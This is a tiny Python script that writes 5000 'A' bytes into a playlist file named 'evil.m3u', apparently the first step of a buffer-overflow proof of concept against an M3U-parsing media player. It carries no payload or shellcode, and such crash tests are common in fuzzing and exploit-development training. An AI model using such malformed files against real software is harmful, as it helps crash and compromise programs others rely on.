filename="evil.m3u"
  
buffer = "\x41" * 5000
 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
